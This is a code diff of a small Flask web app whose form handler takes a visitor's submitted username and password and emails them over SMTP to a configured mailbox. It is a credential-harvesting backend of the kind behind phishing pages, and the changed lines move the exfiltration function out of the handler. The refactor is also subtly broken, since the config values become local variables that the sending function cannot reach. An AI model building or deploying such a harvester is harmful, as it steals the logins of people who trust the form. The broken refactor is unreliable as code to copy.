@@ -4,18 +4,31 @@ import smtplib
 logic = Flask(__name__)
 
 #Read the variables in variables.txt and store them in a list
-file_obj = open('variables.txt', 'r')
-index = 0
-SMTPInformation = list()
+def getConfigVariables():
+	file_obj = open('variables.txt', 'r')
+	index = 0
+	SMTPInformation = list()
 
-for line in file_obj:
-    SMTPInformation.append((line.split(':'))[1].strip())
+	for line in file_obj:
+		SMTPInformation.append((line.split(':'))[1].strip())
 
-#Assign the variables names for concise access
-senderEmail = SMTPInformation[0]
-senderPassword = SMTPInformation[1]
-senderServer = SMTPInformation[2]
-senderPort = SMTPInformation[3]
+	#Assign the variables names for concise access
+	senderEmail = SMTPInformation[0]
+	senderPassword = SMTPInformation[1]
+	senderServer = SMTPInformation[2]
+	senderPort = SMTPInformation[3]
+
+#The method that sets up the SMTP connection and sends the credentials.
+def sendCredentials(user, password):
+	#Set message to a formatted String that includes the email header and content
+	message = 'From: Form Submission <'+senderEmail+'>\nTo: Form Reception <'+senderEmail+'>'+'\nSubject: Form Submission\n\n'+'Username = '+user+' Password = '+password
+	#Open the connection and send the credentials
+	server = smtplib.SMTP(senderServer+':'+senderPort)
+	server.ehlo
+	server.starttls()
+	server.login(senderEmail,senderPassword)
+	server.sendmail(senderEmail, senderEmail, message)
+	server.quit() #Close the connection
 
 #Index page for debugging (Not sure how implement that functionality)
 @logic.route('/index')
@@ -29,27 +42,13 @@ def formPage():
 		#Get the variables from the POST request
 		username = request.form['username']
 		password = request.form['password']
-
-		#The method that sets up the SMTP connection and sends the credentials.
-		def sendCredentials(user, password):
-			#Set message to a formatted String that includes the email header and content
-			message = 'From: Form Submission <'+senderEmail+'>\nTo: Form Reception <'+senderEmail+'>'+'\nSubject: Form Submission\n\n'+'Username = '+user+' Password = '+password
-			#Open the connection and send the credentials
-			server = smtplib.SMTP(senderServer+':'+senderPort)
-			server.ehlo
-			server.starttls()
-			server.login(senderEmail,senderPassword)
-			server.sendmail(senderEmail, senderEmail, message)
-			server.quit() #Close the connection
-
+		getConfigVariables()
 		sendCredentials(username, password) 
 		return render_template("simple_form.html")
 
 	else:
 
 		return render_template("simple_form.html")
-
-
 
 if __name__ == "__main__":
 
